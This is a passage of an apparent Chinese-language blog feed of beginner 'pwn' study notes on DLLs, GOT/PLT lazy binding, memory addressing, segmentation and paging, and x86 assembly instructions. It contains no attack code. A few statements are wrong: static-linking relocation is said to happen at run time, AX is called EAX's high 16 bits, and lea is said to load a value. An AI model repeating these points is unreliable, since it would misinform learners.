title="优点"></a>优点</h5><ul><li><p>生成的可执行文件较小；</p></li><li><p>适用于大规模的软件开发，使开发过程相对独立，耦合度减小，便于不同的开发者和开发组织之间进行开发和测试；</p></li><li><p>不同编程语言编写的程序只要按照函数调用约定就可以调用同一个DLL函数；</p></li><li><p>DLL文件与EXE文件独立，只要输出接口不变（即名称、参数、返回值类型和调用约定不变），更换DLL文件不会对EXE文件造成任何影响，因而极大地提高了可维护性和可扩展性</p></li></ul><h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><ul><li>使用动态链接库的应用程序不是自完备的，它依赖的DLL模块也要存在，如果使用载入时动态链接，程序启动时发现DLL不存在，系统将终止程序并给出错误信息；</li><li>速度比静态链接慢</li></ul><h1 id="GOT与PLT"><a href="#GOT与PLT" class="headerlink" title="GOT与PLT"></a>GOT与PLT</h1><p>为了支持动态链接这一工作过程，在<code>.elf</code>文件中有四个section与之相关：</p><ul><li><code>.got</code> ：全局偏移表（Global Offset Table），用于存储外部符号的绝对地址即运行时符号的真实地址，由链接器进行填充，包含动态链接的函数的地址。</li><li><code>.plt</code>：过程链接表（Procedure Linkage Table），就是一小段跳转指令，存有从<code>.got.plt</code>中查找外部函数地址的代码，若是第一次调用该函数，则会触发链接器解析函数地址并填充在<code>.got.plt</code>相应的位置；若函数地址已经存储在<code>.got.plt</code>中则直接跳转到对应地址继续执行。</li><li><code>.got.plt</code>：是plt的got。它包含返回.plt去触发查找的地址，或者是一个经过查找后填充的正确符号地址。</li><li><code>.plt.got</code>：不知道干啥用的……</li></ul><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>因为静态链接中的重定位工作全部在运行时完成，且当我们引用了某一个库，程序将会对其中的所有函数和全局变量进行重定位，这种情况下，链接的动态库越大链接的时间就越长，系统的启动时间就越长。</p><p>为了解决这一问题，延迟绑定的概念被提出。延迟绑定规定只有符号真正被引用时才会进行重定位，而不是在刚开始就对所有的动态符号进行重定位。</p><p>延迟绑定由plt来实现，在elf文件中，plt表和got表几乎时时刻刻伴随着<del>（这是可以嗑的吗是可以的吗）</del>。</p><p>在got表中，前三项内容不对应符号的引用，分别对应：</p><ul><li>got[0]：当前的elf文件中.synamic段的地址</li><li>got[1]：保留</li><li>got[2]：动态链接器的符号解析函数</li></ul><p>其余的项被用作符号重定位，对于外部函数(即外部跳转)的 got 表项而言，在编译阶段保存的是 .plt 表的起始位置，对于数据引用的 plt 表项而言，编译阶段的值为 0。</p><p>plt 的作用是为每一次模块外部的函数调用设置一小段跳转代码。在 arm 编译器的实现中，对于每一项外部跳转，对应 plt 中三条指令。和 got 类似，plt 的前面部分也被系统”征用”了，这部分负责调用动态链接器中的符号解析函数完成动态解析工作，后续的部分才是对应具体外部跳转的指令。</p><p>在程序的编译阶段，plt 跳转指令表项和 got 表项就实现了绑定，其映射关系为：plt 第一段跳转指令对应 got 第四个表项，plt 第二段跳转指令对应 got 第五个表项，以此类推。</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-33-10.png"></p><p>🌰：<br>对于一个c语言文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world1!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world2!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>对其进行编译后查看其main函数的反汇编结果</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_16-58-54.png"></p><blockquote><p>%rip是一个指针，此处相当于寄存器相对寻址</p></blockquote><p>在<code>0x40054d</code>调用了<code>0x400430&lt;puts@plt&gt;</code>，当程序rip到400340时，需要执行的操作对应的汇编代码为：</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-00-02.png"></p><hr><p>陆陆续续把基础的小零碎学完啦！🥳</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理地址，虚拟地址和逻辑地址</title>
    <link href="/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/"/>
    <url>/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>关于物理地址，虚拟地址和逻辑地址的定义和之间的关系</p><span id="more"></span><p>虽然写了这么多知识点但脑袋还是乱乱的，希望哪天突然开窍叭🥱</p><h3 id="理解内存"><a href="#理解内存" class="headerlink" title="理解内存"></a>理解内存</h3><p>我们平时使用的各种数据都是存储在硬盘等存储器上，但硬盘的运行速度很慢。所以需要运行程序或者使用数据时，这些数据必须从硬盘上转到另一种容量小但速度快很多的存储器，之后才送进CPU进行处理。这中间的存储器就是内存。</p><p>无论何种存储器，软盘、硬盘、光盘或者内存，都有地址。</p><p>其中：</p><ul><li>我们程序所使用的内存地址叫做<strong>虚拟内存地址</strong>（<em>Virtual Memory Address</em>）</li><li>实际存在硬件里面的空间地址叫<strong>物理内存地址</strong>（<em>Physical Memory Address</em>）。</li></ul><h1 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h1><p><strong>物理地址就是常说的内存地址，是内存当中存储数据的一个标识，并不是数据本身，通过内存地址可以找到内存当中存储的数据。</strong></p><p>计算机将内存划分为一个个小的内存单元，同时对其编号，这样就能有效管理内存。在空间划分实践中，一个<strong>内存单元</strong>的大小为1<strong>字节</strong>。一个字节是八个比特，相当于八个二进制位，两个十六进制位。</p><blockquote><p>可以理解为一栋叫内存的楼，每一套商品房都有自己的门牌号叫内存单元，每一个家庭是一个数据，每一位家庭成员所居住的小房间则不会进行编号。</p></blockquote><p>每个内存单元都有编号（内存编号），内存编号可以称为<strong>地址</strong>，在<code>C</code>语言中也称为<strong>指针</strong>。</p><h5 id="🌰"><a href="#🌰" class="headerlink" title="🌰"></a>🌰</h5><p>在内存中存储”修饰符“或”MOD“，可以示意为：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-28_20-14-36.png"></p><p>![]&#x2F;img&#x2F;物理地址，虚拟地址和逻辑地址&#x2F;Snipaste_2023-03-28_20-23-49.png)</p><blockquote><p>数字后面加H表示十六进制</p></blockquote><p>在第一行中，每一格表示一段内存，而格子里的内容是这段内容记下的数据；第二行中每一格内数字就是对应的内存的地址。</p><p>汉字在一个地址空间里储存不下，会放进两个连续的地址空间里。而字母或者阿拉伯数字就可以放进一个内存地址里。在上图中，”修“的内存地址为1000H，或者M的内存地址为”1000H”。</p><h1 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h1><p>虚拟存储器不是任何实际的物理存储器，而是借助磁盘等辅助存储器来扩大主存容量，使之为更大或更多的程序所使用。</p><p><strong>虚拟地址用于指示虚拟存储器的地址，它是用逻辑地址指示的</strong></p><p>在程序运行时，我们需要将进程与物理地址映射起来，才能区分这些内存中存储的数据属于哪个进程。但内存大小有限，进程却可以很多，甚至可能同时进行多个进程。为了实现让很多进程共用一个存储资源有限的内存，我们引出虚拟地址的概念，我们先将进程与虚拟地址映射起来，再将虚拟地址与物理地址映射起来。</p><p>操作系统引入了虚拟内存，进程持有的虚拟地址会通过 CPU 芯片中的内存管理单元（MMU）的映射关系，来转换变成物理地址，然后再通过物理地址访问内存，如下图所示：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-0204ff048148735a260fa5f94f475f14_r.png"></p><h1 id="逻辑地址"><a href="#逻辑地址" class="headerlink" title="逻辑地址"></a>逻辑地址</h1><p>逻辑地址，就是指机器语言指令中用来指定一个操作数或一条指令的地址，<strong>由一个段(segment)和偏移量(offset)组成</strong>，说地直白点就是CPU拿到的地址。</p><p>段号：用来查找段的起始地址，它被存储在段寄存器当中</p><p>偏移地址：是存储单元的物理地址与所在起始段的差值</p><h1 id="各种内存的关系"><a href="#各种内存的关系" class="headerlink" title="各种内存的关系"></a>各种内存的关系</h1><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/bba9443a9c0249ffa501df86649ce5d8.png"></p><h2 id="虚拟地址和物理地址"><a href="#虚拟地址和物理地址" class="headerlink" title="虚拟地址和物理地址"></a>虚拟地址和物理地址</h2><h3 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h3><p>程序是由若干个逻辑分段组成的，如可由代码分段、数据分段、栈段、堆段组成。不同的段是有不同的属性的，所以就用分段（Segmentation）的形式把这些段分离出来。</p><p>分段机制下的虚拟地址由两部分组成，<strong>段选择子</strong>和<strong>段内偏移量</strong>。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><h4 id="段选择子"><a href="#段选择子" class="headerlink" title="段选择子"></a>段选择子</h4><p>段选择子保存在寄存器里。段选择子最重要的是段号，用作段表的索引。段表里保存的是这个段的基地址、段的界限和特权等级等。</p><p>段选择子是十六位的，其中十四位表示地址信息</p><h4 id="段偏移量"><a href="#段偏移量" class="headerlink" title="段偏移量"></a>段偏移量</h4><p>偏移量定义为：把存储单元的<strong>实际地址</strong>与其所在段的<strong>段地址</strong>之间的距离称为段内偏移，也称为“有效地址”或“偏移量”。</p><p>虚拟地址中的段偏移量应该位于0和段界限之间。如果段内偏移量是合法的，就将其段及地址加到段内偏移量得到物理内存地址。</p><p>分段机制会把程序的虚拟地址分成 4 个段，每个段在段表中有一个项，在这一项找到段的基地址，再加上偏移量，于是就能找到物理内存中的地址。</p><h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><ul><li>内存碎片</li></ul><p>举例来说。假设我们现在占有 1G 的物理内存，用户执行了多个程序，游戏占用了 512MB 内存，浏览器占用了 128MB 内存，音乐占用了 256 MB 内存。</p><p>这个时候，我们关闭浏览器，则空闲内存还有 1024 - 512 - 256 &#x3D; 256MB。但如果这个 256MB 不是连续的，被分成了两段 128 MB 内存，这就会导致没有空间再打开一个 200MB 的程序。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><p>这里的内存碎片的问题共有两处地方：</p><p>外部内存碎片，也就是产生了多个<strong>不连续</strong>的小物理内存，导致新的程序无法被装载；</p><p>内部内存碎片，程序所有的内存都被装载到了物理内存，但是这个程序有部分的内存可能并不是很常使用，这也会导致<strong>内存的浪费</strong></p><ul><li>内存交换效率低</li></ul><p>对于外部内存碎片的问题，我们采用内存交换的解决措施。</p><p>可以把音乐程序占用的那 256MB 内存写到硬盘上，然后再从硬盘上读回来到内存里。不过再读回的时候，我们不能装载回原来的位置，而是紧紧跟着那已经被占用了的 512MB 内存后面。这样就能空缺出连续的 256MB 空间，于是新的 200MB 程序就可以装载进来。</p><p>对于多进程的系统来说，用分段的方式，内存碎片是很容易产生的，产生了内存碎片，那不得不重新重新规划内存区域，这个过程会产生性能瓶颈。</p><p>因为硬盘的访问速度要比内存慢太多了，每一次内存交换，我们都需要把一大段连续的内存数据写到硬盘上。</p><p>所以，<strong>如果内存交换的时候，交换的是一个占内存空间很大的程序，这样整个机器都会显得卡顿。</strong></p><h3 id="内存分页"><a href="#内存分页" class="headerlink" title="内存分页"></a>内存分页</h3><p>为了解决内存分段的内存碎片和内存交换效率低的问题，就出现了内存分页。<strong>分页是把整个虚拟和物理内存空间切成一段段固定尺寸的大小</strong>。这样一个连续并且尺寸固定的内存空间，我们叫<strong>页</strong>（<em>Page</em>）</p><p>虚拟地址与物理地址之间通过页表来映射：</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-e63c20d1bace757600fccb051a29eaf6_720w.webp"></p><p>页存储在内存里，由CPU的内存管理单元即MMU负责映射转换的工作吗，这样CPU 就可以直接通过 MMU，找出要实际要访问的物理内存地址。</p><p>由于内存空间都是预先划分好的，也就不会像分段会产生间隙非常小的内存。采用了分页，那么释放的内存都是以页为单位释放的，也就不会产生无法给进程使用的小内存。</p><p>如果内存空间不够，操作系统会把其他正在运行的进程中的「最近没被使用」的内存页面给释放掉，也就是暂时写在硬盘上，称为<strong>换出</strong>（<em>Swap Out</em>）。一旦需要的时候，再加载进来，称为<strong>换入</strong>（<em>Swap In</em>）。所以，一次性写入磁盘的也只有少数的一个页或者几个页，不会花太多时间，内存交换的效率就相对比较高。</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-23f19a580a47fa6c731b32d7df6b6735_720w.webp"></p><p>在分页机制下，虚拟地址分为两部分，<strong>页号</strong>和<strong>页内偏移</strong>。页号作为页表的索引，<strong>页表</strong>包含物理页每页所在<strong>物理内存的基地址</strong>，这个基地址与页内偏移的组合就形成了物理内存地址</p><h4 id="其他东西"><a href="#其他东西" class="headerlink" title="其他东西"></a>其他东西</h4><p>再来，为了解决简单分页产生的页表过大的问题，就有了<strong>多级页表</strong>，它解决了空间上的问题，但这就会导致 CPU 在寻址的过程中，需要有很多层表参与，加大了时间上的开销。于是根据程序的<strong>局部性原理</strong>，在 CPU 芯片中加入了 <strong>TLB</strong>，负责缓存最近常被访问的页表项，大大提高了地址的转换速度。</p><hr><p>冲浪冲到的，我觉得比起枯燥的文字，这个更好理解</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-29_21-54-52.png"></p><hr><p>之前觉得自己很牛直接开始做题，靠一些老本还是能做几道题，但最近发现偏移量和内存地址啥的根本不会看也不会算，还是老老实实打基础叭😳</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86汇编基础</title>
    <link href="/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/27/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>32bit的x86汇编基础，包括一些常规指令，内存和寻址模式</p><span id="more"></span><p>总觉得学了又好像没学······</p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p><img src="/img/x86%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/x86-registers.png"></p><p>现代 x86 处理器有 8 个 32 bit 寄存器，如上图所示。</p><p>寄存器名字是早期计算机历史上流传下来的。</p><ul><li>EAX：一般用作累加器(Accumulator)</li><li>EBX：一般用作基址寄存器(Base)</li><li>ECX：一般用来计数(Count)</li><li>EDX：一般用来存放数据(Data)</li><li>ESI：一般用作源变址(Source Index)</li><li>EDI：一般用作目标变址(Destinatin Index)</li><li>ESP：一般用作堆栈指针(Stack Pointer)</li><li>EBP：一般用作基址指针(Base Pointer)</li></ul><p>现在大部分寄存器的名字已经失去了原来的意义，但有两个是例外：<strong>栈指针寄存器（Stack Pointer）ESP 和基址寄存器（ Base Pointer）EBP</strong>。</p><p>对于 <code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code> 四个寄存器，可以再将 32bit 划分成多个子寄存器， 每个子寄存器有专门的名字。例如 <code>EAX</code> 的高 16bit 叫 <code>AX</code>（去掉 E, 据说E表示 Extended）,低 8bit 叫 <code>AL</code> (Low）, 8-16bit 叫 <code>AH</code> （High）。</p><p>在汇编语言中，这些寄存器的名字是<strong>大小写无关</strong>的，既可以用 <code>EAX</code>，也可以写 <code>eax</code>。</p><h1 id="内存和寻址模式"><a href="#内存和寻址模式" class="headerlink" title="内存和寻址模式"></a>内存和寻址模式</h1><h3 id="程序重定位"><a href="#程序重定位" class="headerlink" title="程序重定位"></a>程序重定位</h3><ul><li>存放程序的为代码段，存放数据的为数据段</li><li>真实的内存单元地址称为物理地址，而程序中的地址为逻辑地址</li></ul><p>由于程序并不知道自己会被加载到哪，因此访存如果用绝对地址将会出错，在执行程序时就需要<strong>程序重定位</strong>这个操作。</p><p>该操作在汇编中通过<code>org</code>指令实现，如<code>org 0A100h</code>代表该程序中的所有标号都以<code>0A100h</code>做偏移。</p><h3 id="内存分段"><a href="#内存分段" class="headerlink" title="内存分段"></a>内存分段</h3><p>将内存分段后，程序只需要识别偏移地址就可以确定数据位置。程序重定位通过设置代码段CS寄存器和数据段DS寄存器实现。</p><p>在8086中，地址总线是20位的，需要将段寄存器左移4位（<code>0x10h</code>，相当于16进制左移1位）变为20位，然后再同偏移地址相加。</p><p>两种典型情况</p><ul><li>因为段寄存器是16位的，在段不重叠的情况下，最多可以将1MB的内存分成65536个段，每个段16B，偏移地址从<code>0000H</code>到<code>000FH</code></li><li>同样在不允许段之间重叠的情况下，因为偏移地址也是16位，1MB的内存最多只能划分成16个段，每段长64KB，段地址由<code>0000H</code>到<code>F000H</code></li></ul><h3 id="声明静态数据区"><a href="#声明静态数据区" class="headerlink" title="声明静态数据区"></a>声明静态数据区</h3><p><code>.DATA</code>：声明静态存储区</p><p>数据类型修饰语：</p><p><code>DB/db</code>：Byte,1Byte</p><p><code>DW/dw</code>：Word,2Byte</p><p><code>DD/dd</code>：Double Word,4Bytes</p><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.DATA<br>var     DB 64    ; 声明一个 byte 值, referred to as location var, containing the value 64.<br>var2    DB ?     ; 声明一个未初始化 byte 值, referred to as location var2.<br>        DB 10    ; 声明一个没有 label 的 byte 值, containing the value 10. Its location is var2 + 1.<br>X       DW ?     ; 声明一个 2-byte 未初始化值, referred to as location X.<br>Y       DD 30000 ; 声明一个 4-byte 值, referred to as location Y, initialized to 30000.<br></code></pre></td></tr></table></figure><p><strong>在汇编中只有一维数组</strong>，没有二维和多维数组。一维数组其实就是内存中的一块连续区域。<code>DUP</code> 和字符串常量也是声明数组的两种方法。</p><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Z       DD 1, 2, 3      ; 声明 3 个 4-byte values, 初始化为 1, 2, and 3. The value of location Z + 8 will be 3.<br>bytes   DB 10 DUP(?)    ; 声明 10 个 uninitialized bytes starting at location bytes.<br>arr     DD 100 DUP(0)   ; 声明 100 个 4-byte words starting at location arr, all initialized to 0<br>str     DB &#x27;hello&#x27;,0    ; 声明 6 bytes starting at the address str, 初始化为 hello and the null (0) byte.<br></code></pre></td></tr></table></figure><h3 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h3><p>有多个指令可以用于内存寻址。如果要访问某一大小的内存，则通过添加修饰词<code>byte</code>、<code>word</code>、<code>dword</code>实现。</p><p>🌰：</p><p>其中<code>MOV</code> 将在内存和寄存器之间移动数据，接受两个参数：第一个参数是目的地，第二个是源。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov byte[ebx], 2<br></code></pre></td></tr></table></figure><h3 id="函数调用-call-堆栈组织"><a href="#函数调用-call-堆栈组织" class="headerlink" title="函数调用(call)堆栈组织"></a>函数调用(call)堆栈组织</h3><h4 id="Caller规则"><a href="#Caller规则" class="headerlink" title="Caller规则"></a>Caller规则</h4><ol><li>在调用函数&#x2F;子程序(subroutine)之前，先保存特定寄存器的状态(caller-saved)（包括<code>eax</code>、<code>ecx</code>、<code>edx</code>）</li><li>将要传的参数堆栈（注意要逆序，<strong>最后一个参数最先入</strong>）。因为栈往下生长，因此第一个参数会被存在最低的地址</li><li>调用函数，<code>call</code>会将返回地址<code>eip</code>压入栈中</li><li>返回时先把参数移出栈，然后将原来保存的寄存器再pop出来</li></ol><h4 id="Callee规则"><a href="#Callee规则" class="headerlink" title="Callee规则"></a>Callee规则</h4><ol><li><p>将<code>ebp</code>推入栈，将<code>esp</code>的值拷贝入<code>ebp</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push ebp<br>mov ebp, esp<br></code></pre></td></tr></table></figure></li><li><p>分配局部变量，栈由上向下增长，如分配3个4B，则<code>sub esp, 12</code></p></li><li><p>保存寄存器状态</p></li></ol><h1 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h1><p>机器指令通常分为三类：数据移动、算术&#x2F;逻辑和控制流。</p><p>接下来的符号解释如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;reg32&gt; ; 任何32位寄存器 （EAX, EBX, ECX, EDX, ESI, EDI, ESP, or EBP）<br>&lt;reg16&gt;; 任何16位寄存器 （AX, BX, CX, or DX）<br>&lt;reg8&gt;; 任何8位寄存器 （AH, BH, CH, DH, AL, BL, CL, or DL）<br>&lt;reg&gt;; 任何寄存器<br>&lt;mem&gt;; 一个内存地址 （e.g., [eax], [var + 4], or dword ptr [eax+ebx]）<br>&lt;con32&gt;; 任何32位常量<br>&lt;con16&gt;; 任何16位常量<br>&lt;con8&gt;; 任何8位常量<br>&lt;con&gt;; 任何8、16、32位常量<br></code></pre></td></tr></table></figure><h2 id="数据移动"><a href="#数据移动" class="headerlink" title="数据移动"></a>数据移动</h2><h4 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h4><p>mov指令将第二操作对象（寄存器、内存内容或是常量值）所引用的数据项复制到其第一操作对象（寄存器或是内存）所引用的位置。</p><p>寄存器到寄存器的移动是合法的，但是直接内存到内存的移动是不合法的。在需要内存传输的情况下，必须首先将源内存中的内容加载到寄存器中，然后才能将其存储到目标内存地址。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov &lt;reg&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;mem&gt;<br>mov &lt;mem&gt;,&lt;reg&gt;<br>mov &lt;reg&gt;,&lt;const&gt;<br>mov &lt;mem&gt;,&lt;const&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax, ebx ; 将EBX中的值复制到EAX<br>mov byte ptr [var], 5 ; 将5存储到地址var的一个字节中<br></code></pre></td></tr></table></figure><h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><p>ESP（堆栈指针）通过push递减。</p><p>push指令将其操作对象放在内存中硬件支持堆栈的顶部。具体地说，PUSH首先将ESP递减4，然后将其操作对象放入内存地址[ESP]处的32位大小的区域中。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push &lt;reg32&gt;<br>push &lt;mem&gt;<br>push &lt;con32&gt;<br></code></pre></td></tr></table></figure><p>🌰:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push eax ; 将eax入栈<br>push [var] ; 将地址var处开始的4个字节入栈<br></code></pre></td></tr></table></figure><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><p>pop指令将4字节数据元素从硬件支持的堆栈顶部移至指定的操作对象（即寄存器或内存位置）。它首先将位于内存位置[SP]的4个字节移动到指定的寄存器或内存位置，然后将SP递增4。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop &lt;reg32&gt;<br>pop &lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pop edi ; 将堆栈的顶部元素弹出到EDI中<br>pop [ebx] ; 将堆栈的顶部元素弹出到内存从EBX位置开始的四个字节中<br></code></pre></td></tr></table></figure><h4 id="lea"><a href="#lea" class="headerlink" title="lea"></a>lea</h4><p>lea指令将其第二个操作对象指定的地址放入其<strong>第一个操作对象指定的寄存器中</strong>。需要注意的是，内存位置的内容不会被加载，并且只有有效地址会被计算并放入寄存器中。这对于获取指向内存区域的指针非常有用。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea &lt;reg32&gt;,&lt;mem&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lea edi, [ebx+4*esi] ; 将地址EBX+4*ESI放入EDI<br>lea eax, [var] ; 将var中的值放在EAX中<br></code></pre></td></tr></table></figure><h2 id="算数和逻辑运算符"><a href="#算数和逻辑运算符" class="headerlink" title="算数和逻辑运算符"></a>算数和逻辑运算符</h2><h4 id="add-整数加法"><a href="#add-整数加法" class="headerlink" title="add-整数加法"></a>add-整数加法</h4><p>add指令将其两个操作对象相加，将结果存储在第一个操作对象中。需要注意的是，虽然两个操作对象都可以是寄存器，<strong>但最多只有一个操作对象可以是内存位置</strong>。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add &lt;reg&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;mem&gt;<br>add &lt;mem&gt;,&lt;reg&gt;<br>add &lt;reg&gt;,&lt;con&gt;<br>add &lt;mem&gt;,&lt;con&gt;<br></code></pre></td></tr></table></figure><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add eax, 10 ; EAX ← EAX + 10<br>add BYTE PTR [var], 10 ; 将存储在内存地址var的单字节值加上10<br></code></pre></td></tr></table></figure><h4 id="sub-整数减法"><a href="#sub-整数减法" class="headerlink" title="sub-整数减法"></a>sub-整数减法</h4><p>sub指令将其第一个操作对象的值减去第二个对象的值，并将结果存储在第一个对象的内存位置。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td 